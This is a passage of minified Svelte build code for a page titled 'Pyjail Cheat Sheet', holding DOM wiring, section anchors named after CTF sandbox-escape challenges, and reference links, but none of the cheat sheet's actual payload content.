"),l(A,"class","text-link"),l(A,"target","_blank"),l(fn,"class","list"),l(ya,"href","#stable-payloads"),l(bn,"id","stable-payloads"),l(yn,"class","language-py"),l(ma,"href","#finding-sinks-from-modules"),l(mn,"id","finding-sinks-from-modules"),l(F,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),l(F,"rel","noopener"),l(F,"class","text-link"),l(F,"target","_blank"),l(D,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),l(D,"rel","noopener"),l(D,"class","text-link"),l(D,"target","_blank"),l(T,"class","list"),l(va,"href","#bullet-points"),l(vn,"id","bullet-points"),l(U,"class","list"),l(g,"class","list"),l(E,"class","list"),l(La,"class","list"),l(P,"class","list"),l(Ta,"class","list"),l(B,"class","list"),l(f,"class","list"),l(Fa,"href","#ctf"),l(gn,"id","ctf"),l(Da,"href","#vsctf-2024-llama-jail-revenge"),l(En,"id","vsctf-2024-llama-jail-revenge"),l(hn,"class","list"),l(xn,"class","language-py"),l(Ln,"class","list"),l(Cn,"class","language-py"),l(An,"class","list"),l(Tn,"class","language-py"),l(Ia,"href","#glacierctf-2023-avatar"),l(Fn,"id","glacierctf-2023-avatar"),l(Dn,"class","list"),l(In,"class","language-py"),l(Hn,"class","list"),l(On,"class","language-py"),l(Ha,"href","#tfc-ctf-2023-my-third-calculator"),l(Rn,"id","tfc-ctf-2023-my-third-calculator"),l(jn,"class","list"),l(Un,"class","language-py"),l(Pn,"class","list"),l(Bn,"class","language-py"),l(Oa,"href","#equinor-ctf-2023-dis-is-it"),l(Mn,"id","equinor-ctf-2023-dis-is-it"),l(qn,"class","list"),l(Nn,"class","language-py"),l(Sn,"class","list"),l(zn,"class","language-py"),l(Ra,"href","#37c3-potluck-ctf-tacocat"),l(Yn,"id","37c3-potluck-ctf-tacocat"),l(Wn,"class","list"),l(Vn,"class","language-py"),l(Gn,"class","list"),l($n,"class","language-py"),l(ja,"href","#internet-festival-2023-ctf-finals-prison"),l(Xn,"id","internet-festival-2023-ctf-finals-prison"),l(Kn,"class","list"),l(Zn,"class","language-py"),l(Jn,"class","list"),l(Qn,"class","language-py"),l(Ua,"href","#wacon-2023-prequal-scavengerhunt"),l(ns,"id","wacon-2023-prequal-scavengerhunt"),l(ss,"class","list"),l(as,"class","language-py"),l(ts,"class","list"),l(ps,"class","language-py"),l(os,"class","list"),l(es,"class","language-py"),l(Pa,"href","#crewctf-2023-starship-1"),l(cs,"id","crewctf-2023-starship-1"),l(ls,"class","list"),l(us,"class","language-py"),l(is,"class","list"),l(ks,"class","language-py"),l(Ba,"href","#crewctf-2023-starship"),l(rs,"id","crewctf-2023-starship"),l(_s,"class","list"),l(ds,"class","language-py"),l(Ma,"href","#crewctf-2023-setjail"),l(fs,"id","crewctf-2023-setjail"),l(bs,"class","list"),l(ys,"class","language-py"),l(qa,"href","#byuctf-2023-builtins-1"),l(ms,"id","byuctf-2023-builtins-1"),l(vs,"class","list"),l(ws,"class","language-py"),l(gs,"class","list"),l(Es,"class","language-py"),l(Na,"href","#byuctf-2023-builtins-2"),l(hs,"id","byuctf-2023-builtins-2"),l(xs,"class","list"),l(Ls,"class","language-py"),l(Cs,"class","list"),l(As,"class","language-py"),l(Sa,"href","#byuctf-2023-a-z0-9"),l(Ts,"id","byuctf-2023-a-z0-9"),l(Fs,"class","list"),l(Ds,"class","language-py"),l(Is,"class","list"),l(Hs,"class","language-py"),l(za,"href","#byuctf-2023-leet-1"),l(Os,"id","byuctf-2023-leet-1"),l(Rs,"class","list"),l(js,"class","language-py"),l(Us,"class","list"),l(Ps,"class","language-py"),l(Ya,"href","#byuctf-2023-leet-2"),l(Bs,"id","byuctf-2023-leet-2"),l(Ms,"class","list"),l(qs,"class","language-py"),l(Ns,"class","list"),l(Ss,"class","language-py"),l(Wa,"href","#byuctf-2023-abcdefghijklm"),l(zs,"id","byuctf-2023-abcdefghijklm"),l(Ys,"class","list"),l(Ws,"class","language-py"),l(Vs,"class","list"),l(Gs,"class","language-py"),l(Va,"href","#byuctf-2023-nopqrstuvwxyz"),l($s,"id","byuctf-2023-nopqrstuvwxyz"),l(Xs,"class","list"),l(Ks,"class","language-py"),l(Zs,"class","list"),l(Js,"class","language-py"),l(Ga,"href","#references"),l(Qs,"id","references"),l(I,"href","https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),l(I,"rel","noopener"),l(I,"class","text-link"),l(I,"target","_blank"),l(H,"href","https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),l(H,"rel","noopener"),l(H,"class","text-link"),l(H,"target","_blank"),l(O,"href","https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),l(O,"rel","noopener"),l(O,"class","text-link"),l(O,"target","_blank"),l(w,"class","list")},m(n,e){c(n,d,e),a(d,v),a(v,x),c(n,R,e),c(n,_,e),a(_,y),a(y,sa),c(n,eo,e),c(n,M,e),a(M,aa),a(aa,Dc),c(n,co,e),c(n,q,e),q.innerHTML=Hd,c(n,lo,e),c(n,N,e),a(N,ta),a(ta,Ic),c(n,uo,e),c(n,S,e),S.innerHTML=Od,c(n,io,e),c(n,z,e),a(z,pa),a(pa,Hc),c(n,ko,e),c(n,Y,e),Y.innerHTML=Rd,c(n,ro,e),c(n,W,e),a(W,oa),a(oa,Oc),c(n,_o,e),c(n,V,e),V.innerHTML=jd,c(n,fo,e),c(n,G,e),a(G,ea),a(ea,Rc),c(n,bo,e),c(n,$,e),a($,ca),a(ca,jc),c(n,yo,e),c(n,X,e),X.innerHTML=Ud,c(n,mo,e),c(n,K,e),a(K,la),a(la,Uc),c(n,vo,e),c(n,Z,e),Z.innerHTML=Pd,c(n,wo,e),c(n,J,e),a(J,ua),a(ua,Pc),c(n,go,e),c(n,Q,e),Q.innerHTML=Bd,c(n,Eo,e),c(n,nn,e),nn.innerHTML=Md,c(n,ho,e),c(n,sn,e),a(sn,ia),a(ia,Bc),c(n,xo,e),c(n,an,e),an.innerHTML=qd,c(n,Lo,e),c(n,tn,e),tn.innerHTML=Nd,c(n,Co,e),c(n,pn,e),a(pn,ka),a(ka,Mc),c(n,Ao,e),c(n,on,e),on.innerHTML=Sd,c(n,To,e),c(n,en,e),a(en,ra),a(ra,qc),c(n,Fo,e),c(n,cn,e),cn.innerHTML=zd,c(n,Do,e),c(n,ln,e),ln.innerHTML=Yd,c(n,Io,e),c(n,un,e),a(un,_a),a(_a,Nc),c(n,Ho,e),c(n,kn,e),kn.innerHTML=Wd,c(n,Oo,e),c(n,rn,e),a(rn,da),a(da,Sc),c(n,Ro,e),c(n,_n,e),a(_n,fa),a(fa,zc),c(n,jo,e),c(n,L,e),a(L,Za),a(Za,C),a(C,Yc),a(L,Wc),a(L,m),a(m,Ja),a(Ja,Vc),a(m,Gc),a(m,Qa),a(Qa,$c),a(m,Xc),a(m,nt),a(nt,Kc),a(m,Zc),a(m,st),a(st,Jc),a(m,Qc),a(m,at),a(at,nl),c(n,Uo,e),c(n,dn,e),a(dn,ba),a(ba,sl),c(n,Po,e),c(n,fn,e),a(fn,tt),a(tt,A),a(A,al),c(n,Bo,e),c(n,bn,e),a(bn,ya),a(ya,tl),c(n,Mo,e),c(n,yn,e),yn.innerHTML=Vd,c(n,qo,e),c(n,mn,e),a(mn,ma),a(ma,pl),c(n,No,e),c(n,T,e),a(T,pt),a(pt,F),a(F,ol),a(T,el),a(T,ot),a(ot,D),a(D,cl),c(n,So,e),c(n,vn,e),a(vn,va),a(va,ll),c(n,zo,e),c(n,f,e),a(f,j),a(j,et),a(et,ul),a(j,il),a(j,ct),a(ct,kl),a(j,rl),a(f,_l),a(f,wa),a(wa,lt),a(lt,dl),a(wa,fl),a(f,bl),a(f,ga),a(ga,ut),a(ut,yl),a(ga,U),a(U,it),a(it,kt),a(kt,ml),a(U,vl),a(U,rt),a(rt,_t),a(_t,wl),a(f,gl),a(f,Ea),a(Ea,dt),a(dt,El),a(Ea,g),a(g,ft),a(ft,bt),a(bt,hl),a(g,xl),a(g,yt),a(yt,mt),a(mt,Ll),a(g,Cl),a(g,vt),a(vt,wt),a(wt,Al),a(f,Tl),a(f,ha),a(ha,gt),a(gt,Fl),a(ha,E),a(E,Et),a(Et,ht),a(ht,Dl),a(E,Il),a(E,xt),a(xt,Lt),a(Lt,Hl),a(E,Ol),a(E,Ct),a(Ct,At),a(At,Rl),a(f,jl),a(f,xa),a(xa,Tt),a(Tt,Ul),a(xa,La),a(La,Ft),a(Ft,Dt),a(Dt,Pl),a(f,Bl),a(f,Ca),a(Ca,It),a(It,Ml),a(Ca,P),a(P,Ht),a(Ht,Ot),a(Ot,ql),a(P,Nl),a(P,Rt),a(Rt,jt),a(jt,Sl),a(f,zl),a(f,wn),a(wn,Ut),a(Ut,Yl),a(wn,Wl),a(wn,B),a(B,Aa),a(Aa,Pt),a(Pt,Vl),a(Aa,Ta),a(Ta,Bt),a(Bt,Mt),a(Mt,Gl),a(B,$l),a(B,qt),a(qt,Nt),a(Nt,Xl),c(n,Yo,e),c(n,gn,e),a(gn,Fa),a(Fa,Kl),c(n,Wo,e),c(n,En,e),a(En,Da),a(Da,Zl),c(n,Vo,e),c(n,hn,e),a(hn,St),a(St,zt),a(zt,Jl),c(n,Go,e),c(n,xn,e),xn.innerHTML=Gd,c(n,$o,e),c(n,Ln,e),a(Ln,Yt),a(Yt,Wt),a(Wt,Ql),c(n,Xo,e),c(n,Cn,e),Cn.innerHTML=$d,c(n,Ko,e),c(n,An,e),a(An,Vt),a(Vt,Gt),a(Gt,nu),c(n,Zo,e),c(n,Tn,e),Tn.innerHTML=Xd,c(n,Jo,e),c(n,Fn,e),a(Fn,Ia),a(Ia,su),c(n,Qo,e),c(n,Dn,e),a(Dn,$t),a($t,Xt),a(Xt,au),c(n,ne,e),c(n,In,e),In.innerHTML=Kd,c(n,se,e),c(n,Hn,e),a(Hn,Kt),a(Kt,Zt),a(Zt,tu),c(n,ae,e),c(n,On,e),On.innerHTML=Zd,c(n,te,e),c(n,Rn,e),a(Rn,Ha),a(Ha,pu),c(n,pe,e),c(n,jn,e),a(jn,Jt),a(Jt,Qt),a(Qt,ou),c(n,oe,e),c(n,Un,e),Un.innerHTML=Jd,c(n,ee,e),c(n,Pn,e),a(Pn,np),a(np,sp),a(sp,eu),c(n,ce,e),c(n,Bn,e),Bn.innerHTML=Qd,c(n,le,e),c(n,Mn,e),a(Mn,Oa),a(Oa,cu),c(n,ue,e),c(n,qn,e),a(qn,ap),a(ap,tp),a(tp,lu),c(n,ie,e),c(n,Nn,e),Nn.innerHTML=nf,c(n,ke,e),c(n,Sn,e),a(Sn,pp),a(pp,op),a(op,uu),c(n,re,e),c(n,zn,e),zn.innerHTML=sf,c(n,_e,e),c(n,Yn,e),a(Yn,Ra),a(Ra,iu),c(n,de,e),c(n,Wn,e),a(Wn,ep),a(ep,cp),a(cp,ku),c(n,fe,e),c(n,Vn,e),Vn.innerHTML=af,c(n,be,e),c(n,Gn,e),a(Gn,lp),a(lp,up),a(up,ru),c(n,ye,e),c(n,$n,e),$n.innerHTML=tf,c(n,me,e),c(n,Xn,e),a(Xn,ja),a(ja,_u),c(n,ve,e),c(n,Kn,e),a(Kn,ip),a(ip,kp),a(kp,du),c(n,we,e),c(n,Zn,e),Zn.innerHTML=pf,c(n,ge,e),c(n,Jn,e),a(Jn,rp),a(rp,_p),a(_p,fu),c(n,Ee,e),c(n,Qn,e),Qn.innerHTML=of,c(n,he,e),c(n,ns,e),a(ns,Ua),a(Ua,bu),c(n,xe,e),c(n,ss,e),a(ss,dp),a(dp,fp),a(fp,yu),c(n,Le,e),c(n,as,e),as.innerHTML=ef,c(n,Ce,e),c(n,ts,e),a(ts,bp),a(bp,yp),a(yp,mu),c(n,Ae,e),c(n,ps,e),ps.innerHTML=cf,c(n,Te,e),c(n,os,e),a(os,mp),a(mp,vp),a(vp,vu),c(n,Fe,e),c(n,es,e),es.innerHTML=lf,c(n,De,e),c(n,cs,e),a(cs,Pa),a(Pa,wu),c(n,Ie,e),c(n,ls,e),a(ls,wp),a(wp,gp),a(gp,gu),c(n,He,e),c(n,us,e),us.innerHTML=uf,c(n,Oe,e),c(n,is,e),a(is,Ep),a(Ep,hp),a(hp,Eu),c(n,Re,e),c(n,ks,e),ks.innerHTML=kf,c(n,je,e),c(n,rs,e),a(rs,Ba),a(Ba,hu),c(n,Ue,e),c(n,_s,e),a(_s,xp),a(xp,Lp),a(Lp,xu),c(n,Pe,e),c(n,ds,e),ds.innerHTML=rf,c(n,Be,e),c(n,fs,e),a(fs,Ma),a(Ma,Lu),c(n,Me,e),c(n,bs,e),a(bs,Cp),a(Cp,Ap),a(Ap,Cu),c(n,qe,e),c(n,ys,e),ys.innerHTML=_f,c(n,Ne,e),c(n,ms,e),a(ms,qa),a(qa,Au),c(n,Se,e),c(n,vs,e),a(vs,Tp),a(Tp,Fp),a(Fp,Tu),c(n,ze,e),c(n,ws,e),ws.innerHTML=df,c(n,Ye,e),c(n,gs,e),a(gs,Dp),a(Dp,Ip),a(Ip,Fu),c(n,We,e),c(n,Es,e),Es.innerHTML=ff,c(n,Ve,e),c(n,hs,e),a(hs,Na),a(Na,Du),c(n,Ge,e),c(n,xs,e),a(xs,Hp),a(Hp,Op),a(Op,Iu),c(n,$e,e),c(n,Ls,e),Ls.innerHTML=bf,c(n,Xe,e),c(n,Cs,e),a(Cs,Rp),a(Rp,jp),a(jp,Hu),c(n,Ke,e),c(n,As,e),As.innerHTML=yf,c(n,Ze,e),c(n,Ts,e),a(Ts,Sa),a(Sa,Ou),c(n,Je,e),c(n,Fs,e),a(Fs,Up),a(Up,Pp),a(Pp,Ru),c(n,Qe,e),c(n,Ds,e),Ds.innerHTML=mf,c(n,nc,e),c(n,Is,e),a(Is,Bp),a(Bp,Mp),a(Mp,ju),c(n,sc,e),c(n,Hs,e),Hs.innerHTML=vf,c(n,ac,e),c(n,Os,e),a(Os,za),a(za,Uu),c(n,tc,e),c(n,Rs,e),a(Rs,qp),a(qp,Np),a(Np,Pu),c(n,pc,e),c(n,js,e),js.innerHTML=wf,c(n,oc,e),c(n,Us,e),a(Us,Sp),a(Sp,zp),a(zp,Bu),c(n,ec,e),c(n,Ps,e),Ps.innerHTML=gf,c(n,cc,e),c(n,Bs,e),a(Bs,Ya),a(Ya,Mu),c(n,lc,e),c(n,Ms,e),a(Ms,Yp),a(Yp,Wp),a(Wp,qu),c(n,uc,e),c(n,qs,e),qs.innerHTML=Ef,c(n,ic,e),c(n,Ns,e),a(Ns,Vp),a(Vp,Gp),a(Gp,Nu),c(n,kc,e),c(n,Ss,e),Ss.innerHTML=hf,c(n,rc,e),c(n,zs,e),a(zs,Wa),a(Wa,Su),c(n,_c,e),c(n,Ys,e),a(Ys,$p),a($p,Xp),a(Xp,zu),c(n,dc,e),c(n,Ws,e),Ws.innerHTML=xf,c(n,fc,e),c(n,Vs,e),a(Vs,Kp),a(Kp,Zp),a(Zp,Yu),c(n,bc,e),c(n,Gs,e),Gs.innerHTML=Lf,c(n,yc,e),c(n,$s,e),a($s,Va),a(Va,Wu),c(n,mc,e),c(n,Xs,e),a(Xs,Jp),a(Jp,Qp),a(Qp,Vu),c(n,vc,e),c(n,Ks,e),Ks.innerHTML=Cf,c(n,wc,e),c(n,Zs,e),a(Zs,no),a(no,so),a(so,Gu),c(n,gc,e),c(n,Js,e),Js.innerHTML=Af,c(n,Ec,e),c(n,Qs,e),a(Qs,Ga),a(Ga,$u),c(n,hc,e),c(n,w,e),a(w,ao),a(ao,I),a(I,Xu),a(w,Ku),a(w,to),a(to,H),a(H,Zu),a(w,Ju),a(w,po),a(po,O),a(O,Qu)},p:Ob,d(n){n&&s(d),n&&s(R),n&&s(_),n&&s(eo),n&&s(M),n&&s(co),n&&s(q),n&&s(lo),n&&s(N),n&&s(uo),n&&s(S),n&&s(io),n&&s(z),n&&s(ko),n&&s(Y),n&&s(ro),n&&s(W),n&&s(_o),n&&s(V),n&&s(fo),n&&s(G),n&&s(bo),n&&s($),n&&s(yo),n&&s(X),n&&s(mo),n&&s(K),n&&s(vo),n&&s(Z),n&&s(wo),n&&s(J),n&&s(go),n&&s(Q),n&&s(Eo),n&&s(nn),n&&s(ho),n&&s(sn),n&&s(xo),n&&s(an),n&&s(Lo),n&&s(tn),n&&s(Co),n&&s(pn),n&&s(Ao),n&&s(on),n&&s(To),n&&s(en),n&&s(Fo),n&&s(cn),n&&s(Do),n&&s(ln),n&&s(Io),n&&s(un),n&&s(Ho),n&&s(kn),n&&s(Oo),n&&s(rn),n&&s(Ro),n&&s(_n),n&&s(jo),n&&s(L),n&&s(Uo),n&&s(dn),n&&s(Po),n&&s(fn),n&&s(Bo),n&&s(bn),n&&s(Mo),n&&s(yn),n&&s(qo),n&&s(mn),n&&s(No),n&&s(T),n&&s(So),n&&s(vn),n&&s(zo),n&&s(f),n&&s(Yo),n&&s(gn),n&&s(Wo),n&&s(En),n&&s(Vo),n&&s(hn),n&&s(Go),n&&s(xn),n&&s($o),n&&s(Ln),n&&s(Xo),n&&s(Cn),n&&s(Ko),n&&s(An),n&&s(Zo),n&&s(Tn),n&&s(Jo),n&&s(Fn),n&&s(Qo),n&&s(Dn),n&&s(ne),n&&s(In),n&&s(se),n&&s(Hn),n&&s(ae),n&&s(On),n&&s(te),n&&s(Rn),n&&s(pe),n&&s(jn),n&&s(oe),n&&s(Un),n&&s(ee),n&&s(Pn),n&&s(ce),n&&s(Bn),n&&s(le),n&&s(Mn),n&&s(ue),n&&s(qn),n&&s(ie),n&&s(Nn),n&&s(ke),n&&s(Sn),n&&s(re),n&&s(zn),n&&s(_e),n&&s(Yn),n&&s(de),n&&s(Wn),n&&s(fe),n&&s(Vn),n&&s(be),n&&s(Gn),n&&s(ye),n&&s($n),n&&s(me),n&&s(Xn),n&&s(ve),n&&s(Kn),n&&s(we),n&&s(Zn),n&&s(ge),n&&s(Jn),n&&s(Ee),n&&s(Qn),n&&s(he),n&&s(ns),n&&s(xe),n&&s(ss),n&&s(Le),n&&s(as),n&&s(Ce),n&&s(ts),n&&s(Ae),n&&s(ps),n&&s(Te),n&&s(os),n&&s(Fe),n&&s(es),n&&s(De),n&&s(cs),n&&s(Ie),n&&s(ls),n&&s(He),n&&s(us),n&&s(Oe),n&&s(is),n&&s(Re),n&&s(ks),n&&s(je),n&&s(rs),n&&s(Ue),n&&s(_s),n&&s(Pe),n&&s(ds),n&&s(Be),n&&s(fs),n&&s(Me),n&&s(bs),n&&s(qe),n&&s(ys),n&&s(Ne),n&&s(ms),n&&s(Se),n&&s(vs),n&&s(ze),n&&s(ws),n&&s(Ye),n&&s(gs),n&&s(We),n&&s(Es),n&&s(Ve),n&&s(hs),n&&s(Ge),n&&s(xs),n&&s($e),n&&s(Ls),n&&s(Xe),n&&s(Cs),n&&s(Ke),n&&s(As),n&&s(Ze),n&&s(Ts),n&&s(Je),n&&s(Fs),n&&s(Qe),n&&s(Ds),n&&s(nc),n&&s(Is),n&&s(sc),n&&s(Hs),n&&s(ac),n&&s(Os),n&&s(tc),n&&s(Rs),n&&s(pc),n&&s(js),n&&s(oc),n&&s(Us),n&&s(ec),n&&s(Ps),n&&s(cc),n&&s(Bs),n&&s(lc),n&&s(Ms),n&&s(uc),n&&s(qs),n&&s(ic),n&&s(Ns),n&&s(kc),n&&s(Ss),n&&s(rc),n&&s(zs),n&&s(_c),n&&s(Ys),n&&s(dc),n&&s(Ws),n&&s(fc),n&&s(Vs),n&&s(bc),n&&s(Gs),n&&s(yc),n&&s($s),n&&s(mc),n&&s(Xs),n&&s(vc),n&&s(Ks),n&&s(wc),n&&s(Zs),n&&s(gc),n&&s(Js),n&&s(Ec),n&&s(Qs),n&&s(hc),n&&s(w)}}}function Ub(na){let d,v;const x=[na[0],Id];let R={$$slots:{default:[jb]},$$scope:{ctx:na}};for(let _=0;_<x.length;_+=1)R=ci(R,x[_]);return d=new Rb({props:R}),{c(){Cb(d.$$.fragment)},l(_){Ab(d.$$.fragment,_)},m(_,y){Tb(d,_,y),v=!0},p(_,[y]){const sa=y&1?Fb(x,[y&1&&Fd(_[0]),y&0&&Fd(Id)]):{};y&2&&(sa.$$scope={dirty:y,ctx:_}),d.$set(sa)},i(_){v||(Db(d.$$.fragment,_),v=!0)},o(_){Ib(d.$$.fragment,_),v=!1},d(_){Hb(d,_)}}}const Id={title:"Pyjail Cheat Sheet",date:"2024-06-16",category:"cheatsheet",description:"",tags:["python3","sandbox","dunder methods"]};function Pb(na,d,v){return na.$$set=x=>{v(0,d=ci(ci({},d),Dd(x)))},d=Dd(d),[d]}class Nb extends hb{constructor(d){super(),xb(this,d,Pb,Ub,Lb,{})}}export{Nb as default,Id as metadata};
